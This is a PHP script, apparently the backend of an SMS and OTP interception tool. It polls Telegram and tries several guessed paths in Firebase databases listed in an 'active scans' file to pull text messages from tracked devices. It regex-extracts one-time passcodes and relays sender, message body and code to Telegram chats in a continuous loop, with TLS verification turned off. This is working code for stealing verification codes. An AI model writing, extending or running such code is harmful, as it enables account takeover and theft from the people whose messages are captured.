<?php
require_once 'config.php';

// Disable time limit to let the script run continuously
set_time_limit(0);

// Disable Apache/PHP buffering to output immediately in the browser
if (function_exists('apache_setenv')) {
    @apache_setenv('no-gzip', 1);
}
@ini_set('zlib.output_compression', 0);
@ini_set('implicit_flush', 1);
ob_implicit_flush(true);
while (ob_get_level() > 0) {
    ob_end_flush();
}

header('Content-Type: text/html; charset=utf-8');
header('Cache-Control: no-cache');

echo "<!DOCTYPE html><html><head><title>Bot Tester</title>";
echo "<style>body{background:#111;color:#0f0;font-family:monospace;padding:20px;font-size:14px;line-height:1.6;} .log{margin:4px 0;} .err{color:#f55;} .ok{color:#5f5;}</style>";
echo "</head><body>";
echo "<h2>🤖 Telegram Bot Long Polling Tester is running...</h2>";
echo "<div class='log'>Fetching updates from Telegram API and forwarding to local bot.php every 3 seconds.</div>";
echo "<div class='log'>Keep this browser tab open to run the bot.</div><br><hr style='border-color:#333;'><br>";
flush();

// Helper to query Firebase
function firebaseRequestByURL($baseUrl, $path) {
    $url = rtrim($baseUrl, '/') . '/' . ltrim($path, '/') . '.json';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

// Find the latest message ID
function getLatestMessageId($messages) {
    if (empty($messages) || !is_array($messages)) return 0;
    $maxId = 0;
    foreach ($messages as $msg) {
        if (is_array($msg)) {
            $id = isset($msg['id']) ? (int)$msg['id'] : 0;
            if ($id > $maxId) {
                $maxId = $id;
            }
        }
    }
    if ($maxId === 0) {
        foreach ($messages as $msg) {
            if (is_array($msg)) {
                $ts = isset($msg['timestamp']) ? (int)$msg['timestamp'] : 0;
                if ($ts > $maxId) {
                    $maxId = $ts;
                }
            }
        }
    }
    return $maxId;
}

// Telegram request
function telegramRequest($method, $params = []) {
    $url = rtrim(TELEGRAM_API_BASE, '/') . "/bot" . BOT_TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

$lastOffsetFile = __DIR__ . '/last_update_offset.txt';
$offset = file_exists($lastOffsetFile) ? (int)file_get_contents($lastOffsetFile) : 0;

$botUrl = 'http://localhost/firebase%20demo%20otp/bot.php';

while (true) {
    // 1. Fetch updates from Telegram using long polling
    $url = TELEGRAM_API_BASE . "/bot" . BOT_TOKEN . "/getUpdates?timeout=2&offset=" . $offset;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($response) {
        $data = json_decode($response, true);
        if (isset($data['ok']) && $data['ok'] && !empty($data['result'])) {
            foreach ($data['result'] as $update) {
                $updateId = $update['update_id'];
                $offset = $updateId + 1;
                file_put_contents($lastOffsetFile, $offset);
                
                echo "<div class='log'>[" . date('H:i:s') . "] Forwarding Update ID: <strong>$updateId</strong> to $botUrl</div>";
                flush();
                
                // Forward the update payload to the local bot.php endpoint
                $forwardCh = curl_init();
                curl_setopt($forwardCh, CURLOPT_URL, $botUrl);
                curl_setopt($forwardCh, CURLOPT_POST, true);
                curl_setopt($forwardCh, CURLOPT_POSTFIELDS, json_encode($update));
                curl_setopt($forwardCh, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
                curl_setopt($forwardCh, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($forwardCh, CURLOPT_TIMEOUT, 10);
                
                $forwardRes = curl_exec($forwardCh);
                $forwardErr = curl_error($forwardCh);
                curl_close($forwardCh);
                
                if ($forwardErr) {
                    echo "<div class='log err'>Forwarding Error: $forwardErr</div>";
                } else {
                    echo "<div class='log ok'>&nbsp;&nbsp;↳ Response from bot: " . htmlspecialchars(substr($forwardRes, 0, 100)) . "</div>";
                }
                flush();
            }
        }
    } else {
        if ($error) {
            echo "<div class='log err'>Telegram Fetch Error: $error</div>";
            flush();
        }
    }
    
    // 2. Scan active devices for new messages in background
    $scansFile = __DIR__ . '/active_scans.json';
    if (file_exists($scansFile)) {
        $scans = json_decode(file_get_contents($scansFile), true) ?: [];
        $scansUpdated = false;
        
        foreach ($scans as $chatId => $scan) {
            $deviceId = $scan['device_id'];
            $dbUrl = $scan['db_url'];
            $lastSeen = (int)$scan['last_seen'];
            
            // Try different paths to fetch messages
            $msgs = firebaseRequestByURL($dbUrl, "messages/" . urlencode($deviceId));
            if (empty($msgs) || !is_array($msgs)) {
                $msgs = firebaseRequestByURL($dbUrl, "user_sms/" . urlencode($deviceId));
            }
            if (empty($msgs) || !is_array($msgs)) {
                $msgs = firebaseRequestByURL($dbUrl, "clients/" . urlencode($deviceId) . "/messages");
            }
            if (empty($msgs) || !is_array($msgs)) {
                $msgs = firebaseRequestByURL($dbUrl, urlencode($deviceId));
            }
            
            if (!empty($msgs) && is_array($msgs)) {
                $latest = getLatestMessageId($msgs);
                if ($latest > $lastSeen) {
                    // Extract all new messages
                    $newMsgs = [];
                    foreach ($msgs as $msg) {
                        if (!is_array($msg)) continue;
                        $msgId = isset($msg['id']) ? (int)$msg['id'] : (isset($msg['timestamp']) ? (int)$msg['timestamp'] : 0);
                        if ($msgId > $lastSeen) {
                            $newMsgs[] = $msg;
                        }
                    }
                    
                    // Sort ascending so old new messages are sent first
                    usort($newMsgs, function($a, $b) {
                        $tsA = isset($a['timestamp']) ? (int)$a['timestamp'] : 0;
                        $tsB = isset($b['timestamp']) ? (int)$b['timestamp'] : 0;
                        $diff = $tsA - $tsB;
                        if ($diff === 0) {
                            $idA = isset($a['id']) ? (int)$a['id'] : 0;
                            $idB = isset($b['id']) ? (int)$b['id'] : 0;
                            return $idA - $idB;
                        }
                        return $diff;
                    });
                    
                    foreach ($newMsgs as $msg) {
                        $body = isset($msg['message']) ? $msg['message'] : (isset($msg['body']) ? $msg['body'] : 'No Body');
                        $sender = isset($msg['sender']) ? $msg['sender'] : (isset($msg['from']) ? $msg['from'] : 'Unknown');
                        $time = isset($msg['dateTime']) ? $msg['dateTime'] : (isset($msg['date']) ? $msg['date'] : 'N/A');
                        preg_match('/\b\d{4,8}\b/', $body, $m);
                        $otp = !empty($m) ? $m[0] : 'Not detected';
                        
                        $txt = "🆕 *New Message Received!*\n\n" .
                               "📱 *Device:* `{$scan['serial_id']}` ({$scan['name']})\n" .
                               "📞 *From:* `{$sender}`\n" .
                               "💬 *Body:* `{$body}`\n" .
                               "🔑 *OTP:* *{$otp}*\n" .
                               "📅 *Time:* _{$time}_";
                        
                        telegramRequest('sendMessage', [
                            'chat_id' => $chatId,
                            'text' => $txt,
                            'parse_mode' => 'Markdown'
                        ]);
                        
                        echo "<div class='log ok'>[" . date('H:i:s') . "] Forwarded new message from device <strong>{$scan['serial_id']}</strong> to Chat: <strong>$chatId</strong></div>";
                        flush();
                    }
                    
                    $scans[$chatId]['last_seen'] = $latest;
                    $scansUpdated = true;
                }
            }
        }
        
        if ($scansUpdated) {
            file_put_contents($scansFile, json_encode($scans, JSON_PRETTY_PRINT));
        }
    }
    
    // Output a subtle heartbeat tick in console/browser
    echo "<script>window.scrollTo(0,document.body.scrollHeight);</script>";
    flush();
    
    // Sleep for 3 seconds before next iteration
    sleep(3);
}
?>
